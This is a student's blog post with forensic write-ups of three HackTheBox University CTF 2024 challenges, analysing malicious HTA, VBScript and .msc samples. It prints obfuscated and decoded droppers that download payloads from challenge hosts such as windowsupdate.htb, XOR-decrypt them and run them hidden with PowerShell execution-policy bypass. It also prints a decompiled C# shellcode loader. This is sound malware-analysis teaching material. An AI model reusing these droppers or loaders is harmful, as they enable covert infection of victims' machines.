---
layout: post
title: HTB University CTF 2024 - Binary Badlands
description: My writeups for forensic category
tags: [HackTheBox, Writeup, Command and Control, Powershell, Blue Team, Python, Malware]
---

Hi guys, this time I joined UniCTF with my school and fortunately I solved 3/4 forensic challenges and for the last challenge because I don't have knowledge enough,
I could not solve it till the CTF end. Btw I felt very happy because of learning many new things! Now it's time for my writeups, let's go! 

### Frontier Exposed
In this challenge we was given a website which contained some Linux filesystems: 

![image](https://github.com/user-attachments/assets/a6afb641-8d62-4b42-9717-f7343f622c04)

By my routine, I always check .bash_history first because it recorded user command activities: 

![image](https://github.com/user-attachments/assets/050bcb79-7843-453e-a7f9-88f13ea2fc10)

There was a base64 string in **c2client** command, decoded it by CyberChef and I got the flag: 

![image](https://github.com/user-attachments/assets/ad47e8bf-3eb9-4ed3-bf14-ebc2b375feec)

**Flag: HTB{C2_cr3d3nt14ls_3xp0s3d}**

### Wanter Alive
For this challenge our sample was a .hta file which was used multilevel URL-encoding:

![image](https://github.com/user-attachments/assets/ead413dd-46e7-4a53-83ad-a6296a7b3f9c)

I used CyberChef to decode and beautify it: 

![image](https://github.com/user-attachments/assets/068a8a09-2a47-4868-afac-d4f67e8a1abc)

Scroll down and I saw there was a Powershell script contained base64 payload: 

![image](https://github.com/user-attachments/assets/42b3d351-fb48-4e38-b5fe-8c106dc83c8a)

Decoded it and I got new payload:

![image](https://github.com/user-attachments/assets/cfcc2986-ca5f-4c7f-aaaf-22e82bf89b9b)

In this script it would download **wanted.tIF** and save it in **wanted.vbs**. Let's download the file and analyse: 

![image](https://github.com/user-attachments/assets/6f69c290-5ead-443a-9803-610d9b4967ec)

It's kinda long so I will just mention about the most suspicious function there: 

```vbs
If Not mesor() Then
        
        On Error Resume Next

        latifoliado = "U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZd2FudGVkCgXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1td2FudGVkCgTe"
        latifoliado = latifoliado & "XN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2Vydmld2FudGVkCgjZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZd2FudGVkCgGl"
        latifoliado = latifoliado & "uZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgcd2FudGVkCg3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19d2FudGVkCgyc"
        latifoliado = latifoliado & "CcpKSkpd2FudGVkCgd2FudGVkCg"
        
        Dim parrana
        parrana = "d2FudGVkCg"

        Dim arran
        arran =" d2FudGVkCg  d2FudGVkCg "
        arran = arran & "$d2FudGVkCgCod2FudGVkCgd"
        arran = arran & "id2FudGVkCggod2FudGVkCg "
        arran = arran & "d2FudGVkCg" & latifoliado & "d2FudGVkCg"
        arran = arran & "$d2FudGVkCgOWd2FudGVkCgj"
        arran = arran & "ud2FudGVkCgxdd2FudGVkCg "
        arran = arran & "=d2FudGVkCg [d2FudGVkCgs"
        arran = arran & "yd2FudGVkCgstd2FudGVkCge"
        arran = arran & "md2FudGVkCg.Td2FudGVkCge"
        arran = arran & "xd2FudGVkCgt.d2FudGVkCge"
        arran = arran & "nd2FudGVkCgcod2FudGVkCgd"
        arran = arran & "id2FudGVkCgngd2FudGVkCg]"
        arran = arran & ":d2FudGVkCg:Ud2FudGVkCgT"
        arran = arran & "Fd2FudGVkCg8.d2FudGVkCgG"
        arran = arran & "ed2FudGVkCgtSd2FudGVkCgt"
        arran = arran & "rd2FudGVkCgind2FudGVkCgg"
        arran = arran & "(d2FudGVkCg[sd2FudGVkCgy"
        arran = arran & "sd2FudGVkCgted2FudGVkCgm"
        arran = arran & ".d2FudGVkCgCod2FudGVkCgn"
        arran = arran & "vd2FudGVkCgerd2FudGVkCgt"
        arran = arran & "]d2FudGVkCg::d2FudGVkCgF"
        arran = arran & "rd2FudGVkCgomd2FudGVkCgb"
        arran = arran & "ad2FudGVkCgsed2FudGVkCg6"
        arran = arran & "4d2FudGVkCgStd2FudGVkCgr"
        arran = arran & "id2FudGVkCgngd2FudGVkCg("
        arran = arran & "$d2FudGVkCgcod2FudGVkCgd"
        arran = arran & "id2FudGVkCggod2FudGVkCg)"
        arran = arran & ")d2FudGVkCg;pd2FudGVkCgo"
        arran = arran & "wd2FudGVkCgerd2FudGVkCgs"
        arran = arran & "hd2FudGVkCgeld2FudGVkCgl"
        arran = arran & ".d2FudGVkCgexd2FudGVkCge"
        arran = arran & " d2FudGVkCg-wd2FudGVkCgi"
        arran = arran & "nd2FudGVkCgdod2FudGVkCgw"
        arran = arran & "sd2FudGVkCgtyd2FudGVkCgl"
        arran = arran & "ed2FudGVkCg hd2FudGVkCgi"
        arran = arran & "dd2FudGVkCgded2FudGVkCgn"
        arran = arran & " d2FudGVkCg-ed2FudGVkCgx"
        arran = arran & "ed2FudGVkCgcud2FudGVkCgt"
        arran = arran & "id2FudGVkCgond2FudGVkCgp"
        arran = arran & "od2FudGVkCglid2FudGVkCgc"
        arran = arran & "yd2FudGVkCg bd2FudGVkCgy"
        arran = arran & "pd2FudGVkCgasd2FudGVkCgs"
        arran = arran & " d2FudGVkCg-Nd2FudGVkCgo"
        arran = arran & "Pd2FudGVkCgrod2FudGVkCgf"
        arran = arran & "id2FudGVkCgled2FudGVkCg "
        arran = arran & "-d2FudGVkCgcod2FudGVkCgm"
        arran = arran & "md2FudGVkCgand2FudGVkCgd"
        arran = arran & " d2FudGVkCg$Od2FudGVkCgW"
        arran = arran & "jd2FudGVkCguxd2FudGVkCgD"
        arran = descortinar(arran, parrana, "")
            
        Dim sandareso
        sandareso = "pd2FudGVkCgo"
        sandareso = sandareso & "wd2FudGVkCgr"
        sandareso = sandareso & "sd2FudGVkCge"
        sandareso = sandareso & "ld2FudGVkCgl -cd2FudGVkCgommad2FudGVkCgnd "
        sandareso = descortinar(sandareso, parrana, "")

        sandareso = sandareso & arran

        Dim incentiva
        Set incentiva = CreateObject("WScript.Shell")
        incentiva.Run sandareso, 0, False 
        WScript.Quit(rumbo)
```

In this function they would try to run **sandareso** which was created from **latifoliado**, **arran** and **parrana**. Noticed that **parrana** was used as bonus 
characters which made the code obfuscated! To make it easier to look, we need to remove **parrana** by using replacing all **parrana** with nothing. After removed, it looked 
more legit:

```vbs
If Not mesor() Then
        
        On Error Resume Next

        latifoliado = "U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1tTe"
        latifoliado = latifoliado & "XN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZGl"
        latifoliado = latifoliado & "uZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgc3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19yc"
        latifoliado = latifoliado & "CcpKSkp"
        
        Dim parrana
        parrana = ""

        Dim arran
        arran ="    "
        arran = arran & "$Cod"
        arran = arran & "igo "
        arran = arran & "" & latifoliado & ""
        arran = arran & "$OWj"
        arran = arran & "uxd "
        arran = arran & "= [s"
        arran = arran & "yste"
        arran = arran & "m.Te"
        arran = arran & "xt.e"
        arran = arran & "ncod"
        arran = arran & "ing]"
        arran = arran & "::UT"
        arran = arran & "F8.G"
        arran = arran & "etSt"
        arran = arran & "ring"
        arran = arran & "([sy"
        arran = arran & "stem"
        arran = arran & ".Con"
        arran = arran & "vert"
        arran = arran & "]::F"
        arran = arran & "romb"
        arran = arran & "ase6"
        arran = arran & "4Str"
        arran = arran & "ing("
        arran = arran & "$cod"
        arran = arran & "igo)"
        arran = arran & ");po"
        arran = arran & "wers"
        arran = arran & "hell"
        arran = arran & ".exe"
        arran = arran & " -wi"
        arran = arran & "ndow"
        arran = arran & "styl"
        arran = arran & "e hi"
        arran = arran & "dden"
        arran = arran & " -ex"
        arran = arran & "ecut"
        arran = arran & "ionp"
        arran = arran & "olic"
        arran = arran & "y by"
        arran = arran & "pass"
        arran = arran & " -No"
        arran = arran & "Prof"
        arran = arran & "ile "
        arran = arran & "-com"
        arran = arran & "mand"
        arran = arran & " $OW"
        arran = arran & "juxD"
        arran = descortinar(arran, parrana, "")
            
        Dim sandareso
        sandareso = "po"
        sandareso = sandareso & "wr"
        sandareso = sandareso & "se"
        sandareso = sandareso & "ll -command "
        sandareso = descortinar(sandareso, parrana, "")

        sandareso = sandareso & arran

        Dim incentiva
        Set incentiva = CreateObject("WScript.Shell")
        incentiva.Run sandareso, 0, False 
        WScript.Quit(rumbo)
```

From here you can try to recreate the code and extract the payload, but I extracted it directly: 

![image](https://github.com/user-attachments/assets/677d9ee9-28c1-4093-a345-364f92f4fc10)

I accessed the link and got the flag: 

![image](https://github.com/user-attachments/assets/85f30d1b-7ef0-41be-8bea-2f9fe1a66286)

**Flag: HTB{c4tch3d_th3_m4lw4r3_w1th_th3_l4ss0_4a2f11574a7fb0927abc22294f018fd0}**

### Binary Badresources

This challenge was so Vietnamese and maybe I could guess who created this challenge 😂😂😂. Btw this challenge was so fun and I enjoyed this so much. For the challenge 
they gave me a .msc file: 

![image](https://github.com/user-attachments/assets/4e755d68-68ea-4b59-9d3e-fee263857eab)

Scroll down again and I found a JavaScript code which was obfuscated. I used [Obfuscator.io](https://obf-io.deobfuscate.io/) to beautify it: 

![image](https://github.com/user-attachments/assets/adcc757b-f818-4a76-a704-d80147e4a9c1)

After beautfied I got a xml file, I decoded it from URL-encoding again: 

![image](https://github.com/user-attachments/assets/efea9508-d0e8-4886-8386-19989acded17)

If you are Vietnamese then I'm sure that you will understand why I said author is Vietnamese 😂😂😂. You will see that in the script they looped through the 
obfuscated string and extracted the character, adjusted its ASCII value and appended it to **TpHCM**. From here I recreated it to extract the result: 

```python
encoded_string = "Stxmsr$I|tpmgmxHmq$sfnWlipp0$sfnJWS0$sfnLXXTHmq$wxvYVP50$wxvYVP60$wxvYVP70$wxvWls{jmpiYVPHmq$wxvHs{rpsehTexl50$wxvHs{rpsehTexl60$wxvHs{rpsehTexl70$wxvWls{jmpiTexlHmq$wxvI|igyxefpiTexl0$wxvTs{ivWlippWgvmtxwxvYVP5$A$&lxxt>33{mrhs{wythexi2lxf3gwvww2i|i&wxvYVP6$A$&lxxt>33{mrhs{wythexi2lxf3gwvww2hpp&wxvYVP7$A$&lxxt>33{mrhs{wythexi2lxf3gwvww2i|i2gsrjmk&wxvWls{jmpiYVP$A$&lxxt>33{mrhs{wythexi2lxf3{erxih2thj&wxvHs{rpsehTexl5$A$&G>`Ywivw`Tyfpmg`gwvww2i|i&wxvHs{rpsehTexl6$A$&G>`Ywivw`Tyfpmg`gwvww2hpp&wxvHs{rpsehTexl7$A$&G>`Ywivw`Tyfpmg`gwvww2i|i2gsrjmk&wxvWls{jmpiTexl$A$&G>`Ywivw`Tyfpmg`{erxih2thj&wxvI|igyxefpiTexl$A$&G>`Ywivw`Tyfpmg`gwvww2i|i&Wix$sfnWlipp$A$GviexiSfnigx,&[Wgvmtx2Wlipp&-Wix$sfnJWS$A$GviexiSfnigx,&Wgvmtxmrk2JmpiW}wxiqSfnigx&-Wix$sfnLXXT$A$GviexiSfnigx,&QW\QP62\QPLXXT&-Mj$Rsx$sfnJWS2JmpiI|mwxw,wxvHs{rpsehTexl5-$Xlir$$$$Hs{rpsehJmpi$wxvYVP50$wxvHs{rpsehTexl5Irh$MjMj$Rsx$sfnJWS2JmpiI|mwxw,wxvHs{rpsehTexl6-$Xlir$$$$Hs{rpsehJmpi$wxvYVP60$wxvHs{rpsehTexl6Irh$MjMj$Rsx$sfnJWS2JmpiI|mwxw,wxvHs{rpsehTexl7-$Xlir$$$$Hs{rpsehJmpi$wxvYVP70$wxvHs{rpsehTexl7Irh$MjMj$Rsx$sfnJWS2JmpiI|mwxw,wxvWls{jmpiTexl-$Xlir$$$$Hs{rpsehJmpi$wxvWls{jmpiYVP0$wxvWls{jmpiTexlIrh$MjwxvTs{ivWlippWgvmtx$A$c&teveq$,&$*$zfGvPj$*$c&$$$$_wxvmrka(JmpiTexl0&$*$zfGvPj$*$c&$$$$_wxvmrka(Oi}Texl&$*$zfGvPj$*$c&-&$*$zfGvPj$*$c&(oi}$A$_W}wxiq2MS2Jmpia>>ViehEppF}xiw,(Oi}Texl-&$*$zfGvPj$*$c&(jmpiGsrxirx$A$_W}wxiq2MS2Jmpia>>ViehEppF}xiw,(JmpiTexl-&$*$zfGvPj$*$c&(oi}Pirkxl$A$(oi}2Pirkxl&$*$zfGvPj$*$c&jsv$,(m$A$4?$(m$1px$(jmpiGsrxirx2Pirkxl?$(m//-$&$*$zfGvPj$*$c&$$$$(jmpiGsrxirx_(ma$A$(jmpiGsrxirx_(ma$1f|sv$(oi}_(m$)$(oi}Pirkxla&$*$zfGvPj$*$c&&$*$zfGvPj$*$c&_W}wxiq2MS2Jmpia>>[vmxiEppF}xiw,(JmpiTexl0$(jmpiGsrxirx-&$*$zfGvPjHmq$sfnJmpiSr$Ivvsv$Viwyqi$Ri|xWix$sfnJmpi$A$sfnJWS2GviexiXi|xJmpi,&G>`Ywivw`Tyfpmg`xiqt2tw5&0$Xvyi-Mj$Ivv2Ryqfiv$@B$4$Xlir$$$$[Wgvmtx2Igls$&Ivvsv$gviexmrk$Ts{ivWlipp$wgvmtx$jmpi>$&$*$Ivv2Hiwgvmtxmsr$$$$[Wgvmtx2UymxIrh$MjsfnJmpi2[vmxiPmri$wxvTs{ivWlippWgvmtxsfnJmpi2GpswiHmq$evvJmpiTexlwevvJmpiTexlw$A$Evve},wxvHs{rpsehTexl50$wxvHs{rpsehTexl70$wxvWls{jmpiTexl-Hmq$mJsv$m$A$4$Xs$YFsyrh,evvJmpiTexlw-$$$$Hmq$mrxVixyvrGshi$$$$mrxVixyvrGshi$A$sfnWlipp2Vyr,&ts{ivwlipp$1I|igyxmsrTspmg}$F}teww$1Jmpi$G>`Ywivw`Tyfpmg`xiqt2tw5$1JmpiTexl$&$*$Glv,78-$*$evvJmpiTexlw,m-$*$Glv,78-$*$&$1Oi}Texl$&$*$Glv,78-$*$wxvHs{rpsehTexl6$*$Glv,78-0$40$Xvyi-$$$$$$$$Mj$mrxVixyvrGshi$@B$4$Xlir$$$$$$$$[Wgvmtx2Igls$&Ts{ivWlipp$wgvmtx$i|igyxmsr$jempih$jsv$&$*$evvJmpiTexlw,m-$*$&${mxl$i|mx$gshi>$&$*$mrxVixyvrGshi$$$$Irh$MjRi|xsfnWlipp2Vyr$wxvI|igyxefpiTexl0$50$XvyisfnWlipp2Vyr$wxvWls{jmpiTexl0$50$XvyisfnJWS2HipixiJmpi$&G>`Ywivw`Tyfpmg`gwvww2hpp&sfnJWS2HipixiJmpi$&G>`Ywivw`Tyfpmg`gwvww2i|i&sfnJWS2HipixiJmpi$&G>`Ywivw`Tyfpmg`gwvww2i|i2gsrjmk&sfnJWS2HipixiJmpi$&G>`Ywivw`Tyfpmg`xiqt2tw5&Wyf$Hs{rpsehJmpi,yvp0$texl-$$$$Hmq$sfnWxvieq$$$$Wix$sfnWxvieq$A$GviexiSfnigx,&EHSHF2Wxvieq&-$$$$sfnLXXT2Stir$&KIX&0$yvp0$Jepwi$$$$sfnLXXT2Wirh$$$$Mj$sfnLXXT2Wxexyw$A$644$Xlir$$$$$$$$sfnWxvieq2Stir$$$$$$$$sfnWxvieq2X}ti$A$5$$$$$$$$sfnWxvieq2[vmxi$sfnLXXT2ViwtsrwiFsh}$$$$$$$$sfnWxvieq2WeziXsJmpi$texl0$6$$$$$$$$sfnWxvieq2Gpswi$$$$Irh$Mj$$$$Wix$sfnWxvieq$A$RsxlmrkIrh$Wyf"
TpHCM = ""
for i in range(1, 3220):
    TpHCM += chr(ord(encoded_string[i-1]) - 5 + 1)
print(TpHCM)
```

![image](https://github.com/user-attachments/assets/0ed8cde4-2deb-4564-af59-833ddf821ef4)

```vbs
Option Explicit
Dim objShell, objFSO, objHTTP
Dim strURL1, strURL2, strURL3, strShowfileURL
Dim strDownloadPath1, strDownloadPath2, strDownloadPath3, strShowfilePath
Dim strExecutablePath, strPowerShellScript
strURL1 = "http://windowsupdate.htb/csrss.exe"
strURL2 = "http://windowsupdate.htb/csrss.dll"
strURL3 = "http://windowsupdate.htb/csrss.exe.config"
strShowfileURL = "http://windowsupdate.htb/wanted.pdf"
strDownloadPath1 = "C:\Users\Public\csrss.exe"
strDownloadPath2 = "C:\Users\Public\csrss.dll"
strDownloadPath3 = "C:\Users\Public\csrss.exe.config"
strShowfilePath = "C:\Users\Public\wanted.pdf"
strExecutablePath = "C:\Users\Public\csrss.exe"

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objHTTP = CreateObject("MSXML2.XMLHTTP")

If Not objFSO.FileExists(strDownloadPath1) Then
    DownloadFile strURL1, strDownloadPath1
End If
If Not objFSO.FileExists(strDownloadPath2) Then
    DownloadFile strURL2, strDownloadPath2
End If
If Not objFSO.FileExists(strDownloadPath3) Then
    DownloadFile strURL3, strDownloadPath3
End If
If Not objFSO.FileExists(strShowfilePath) Then
    DownloadFile strShowfileURL, strShowfilePath
End If

strPowerShellScript = _
"param (" & vbCrLf & _
"    [string]$FilePath," & vbCrLf & _
"    [string]$KeyPath" & vbCrLf & _
")" & vbCrLf & _
"$key = [System.IO.File]::ReadAllBytes($KeyPath)" & vbCrLf & _
"$fileContent = [System.IO.File]::ReadAllBytes($FilePath)" & vbCrLf & _
"$keyLength = $key.Length" & vbCrLf & _
"for ($i = 0; $i -lt $fileContent.Length; $i++) {" & vbCrLf & _
"    $fileContent[$i] = $fileContent[$i] -bxor $key[$i % $keyLength]" & vbCrLf & _
"}" & vbCrLf & _
"[System.IO.File]::WriteAllBytes($FilePath, $fileContent)" & vbCrLf

Dim objFile
On Error Resume Next
Set objFile = objFSO.CreateTextFile("C:\Users\Public\temp.ps1", True)
If Err.Number <> 0 Then
    WScript.Echo "Error creating PowerShell script file: " & Err.Description
    WScript.Quit
End If
objFile.WriteLine strPowerShellScript
objFile.Close

Dim arrFilePaths
arrFilePaths = Array(strDownloadPath1, strDownloadPath3, strShowfilePath)

Dim i
For i = 0 To UBound(arrFilePaths)
    Dim intReturnCode
    intReturnCode = objShell.Run("powershell -ExecutionPolicy Bypass -File C:\Users\Public\temp.ps1 -FilePath " & Chr(34) & arrFilePaths(i) & Chr(34) & " -KeyPath " & Chr(34) & strDownloadPath2 & Chr(34), 0, True)

    If intReturnCode <> 0 Then
        WScript.Echo "PowerShell script execution failed for " & arrFilePaths(i) & " with exit code: " & intReturnCode
    End If
Next

objShell.Run strExecutablePath, 1, True
objShell.Run strShowfilePath, 1, True
objFSO.DeleteFile "C:\Users\Public\csrss.dll"
objFSO.DeleteFile "C:\Users\Public\csrss.exe"
objFSO.DeleteFile "C:\Users\Public\csrss.exe.config"
objFSO.DeleteFile "C:\Users\Public\temp.ps1"

Sub DownloadFile(url, path)
    Dim objStream
    Set objStream = CreateObject("ADODB.Stream")
    objHTTP.Open "GET", url, False
    objHTTP.Send
    If objHTTP.Status = 200 Then
        objStream.Open
        objStream.Type = 1
        objStream.Write objHTTP.ResponseBody
        objStream.SaveToFile path, 2
        objStream.Close
    End If
    Set objStream = Nothing
End Sub
```
The code would download some files and I noticed that in the code there had a function which was created to decrypt the file downloaded from link using XOR algorithm 
and when I scrolled down I found a Powershell script which mentioned about the key to decrypt: 

```
intReturnCode = objShell.Run("powershell -ExecutionPolicy Bypass -File C:\Users\Public\temp.ps1 -FilePath " & Chr(34) & arrFilePaths(i) & Chr(34) & " -KeyPath " & Chr(34) & strDownloadPath2 & Chr(34), 0, True)
```

From here **csrss.dll** will be the key to decrypt other files. I wrote a script to decrypt all and I got another payload when decrypted **csrss.exe.config**: 

```python
def xor_decrypt(file_path, key_path):
    with open(key_path, "rb") as key_file:
        key = key_file.read()
    with open(file_path, "rb") as encrypted_file:
        file_content = bytearray(encrypted_file.read())
    key_length = len(key)
    for i in range(len(file_content)):
        file_content[i] ^= key[i % key_length]
    with open(file_path, "wb") as decrypted_file:
        decrypted_file.write(file_content)

file_path = "C:\\Users\\Admin\\Downloads\\csrss.exe.config"
key_path = "C:\\Users\\Admin\\Downloads\\csrss.dll"

xor_decrypt(file_path, key_path)
print(f"Decryption complete. The file {file_path} has been decrypted.")
```

![image](https://github.com/user-attachments/assets/10340b08-56d8-4ef4-8bfc-3a17983a094f)

The .json content was an exe file and when I stringed it I found that there was some C# library, so I used dnSpy to decompile it: 

![image](https://github.com/user-attachments/assets/36bd8003-d52b-4e32-a8e0-9121c61034f6)

```csharp
  public static void silverquickclam06103()
  {
    ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls12;
    byte[] array = dfsvc.cameldeeplybushes11928.indigowilddrain95354(new Uri(dfsvc.magentaboorishgirl01630.indigoinnocentbeast26519("ZzfccaKJB3CrDvOnj/6io5OR7jZGL0pr0sLO/ZcRNSa1JLrHA+k2RN1QkelHxKVvhrtiCDD14Aaxc266kJOzF59MfhoI5hJjc5hx7kvGAFw=")));
    uint num = (uint)array.Length;
    IntPtr intPtr = dfsvc.avocadoreflectivefloor83964.VirtualAlloc(IntPtr.Zero, num, 12288U, 64U);
    Marshal.Copy(array, 0, intPtr, (int)num);
    dfsvc.avocadoreflectivefloor83964.WaitForSingleObject(dfsvc.avocadoreflectivefloor83964.CreateThread(IntPtr.Zero, 0U, intPtr, IntPtr.Zero, 0U, IntPtr.Zero), uint.MaxValue);
  }
```

In function **silverquickclam06103** it would try to decrypt a string and it connected to the function which used AES to decrypt:

```csharp
  private static string charcoalsleepyadvertisement91853(byte[] creamgrievingcover13021)
  {
    string @string;
    using (AesManaged aesManaged = new AesManaged())
    {
      aesManaged.Mode = dfsvc.magentaboorishgirl01630.cipherMode;
      aesManaged.Padding = dfsvc.magentaboorishgirl01630.paddingMode;
      aesManaged.Key = dfsvc.magentaboorishgirl01630.steelshiveringpark49573;
      aesManaged.IV = dfsvc.magentaboorishgirl01630.fuchsiaaromaticmarket70603;
      ICryptoTransform cryptoTransform = aesManaged.CreateDecryptor(aesManaged.Key, aesManaged.IV);
      using (MemoryStream memoryStream = new MemoryStream(creamgrievingcover13021))
      {
        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, 0))
        {
          byte[] array = new byte[creamgrievingcover13021.Length];
          int count = cryptoStream.Read(array, 0, array.Length);
          @string = Encoding.UTF8.GetString(array, 0, count);
        }
      }
    }
    return @string;
  }
```
Scroll down more I got the key and iv to decrypt: 

![image](https://github.com/user-attachments/assets/04502252-3437-4882-b47d-909ae39bcb36)

From here I wrote a script again to decrypt: 

```python
import base64
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

key_string = "vudzvuokmioomyialpkyydvgqdmdkdxy"
iv_string = "tbbliftalildywic"

key = hashlib.sha256(key_string.encode()).digest()
iv = iv_string.encode('utf-8')
encrypted_data_base64 = "ZzfccaKJB3CrDvOnj/6io5OR7jZGL0pr0sLO/ZcRNSa1JLrHA+k2RN1QkelHxKVvhrtiCDD14Aaxc266kJOzF59MfhoI5hJjc5hx7kvGAFw="
encrypted_data = base64.b64decode(encrypted_data_base64)

cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
decryptor = cipher.decryptor()

decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
unpadded_data = decrypted_data.rstrip(b'\x00')
decrypted_string = unpadded_data.decode('utf-8')
print("Decrypted String:", decrypted_string)
```

![image](https://github.com/user-attachments/assets/fce99eba-e34b-4796-9566-4deaa3fd8a6f)

After decrypted, I got a link, I downloaded it and got the flag:

![image](https://github.com/user-attachments/assets/198bdaab-af5e-4ab2-abab-a1f382972bc8)

**Flag: HTB{mSc_1s_b31n9_s3r10u5ly_4buSed}**

Thank you very much for reading my writeup. If you have any feedbacks or questions, please feel free to contact me! See you in the next post, bye 💙💙💙





